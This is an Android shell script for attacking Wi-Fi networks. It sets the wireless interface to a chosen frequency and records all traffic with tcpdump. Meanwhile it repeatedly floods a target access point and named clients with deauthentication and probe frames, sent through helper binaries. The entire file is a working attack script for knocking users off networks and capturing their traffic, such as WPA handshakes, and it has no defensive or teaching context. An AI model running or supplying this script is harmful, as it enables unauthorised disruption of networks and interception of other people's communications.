#!/system/bin/sh
# usage: target.sh <freq_mhz> <duration_s> <ap_bssid_hex> [client_hex ...]
#   reads BPF filter from /data/local/tmp/target_filter.txt
FREQ=$1; DUR=$2; AP=$3; shift 3
FLT=$(cat /data/local/tmp/target_filter.txt 2>/dev/null)
iw dev wlan0 set freq $FREQ 2>/dev/null
sleep 2
rm -f /data/local/tmp/target.pcap
timeout $DUR tcpdump -i wlan0 -s 0 -w /data/local/tmp/target.pcap "$FLT" >/dev/null 2>&1 &
TPID=$!
sleep 2
END=$(( $(date +%s) + $DUR ))
while [ $(date +%s) -lt $END ]; do
  /data/local/tmp/deauth wlan0 $AP ffffffffffff 30 50 2>/dev/null
  /data/local/tmp/probe wlan0 $AP $AP 32H10F 10 120 2>/dev/null
  for c in "$@"; do
    /data/local/tmp/deauth wlan0 $AP $c 15 80 2>/dev/null
  done
done
wait $TPID 2>/dev/null
wc -c /data/local/tmp/target.pcap
echo TARGET_DONE
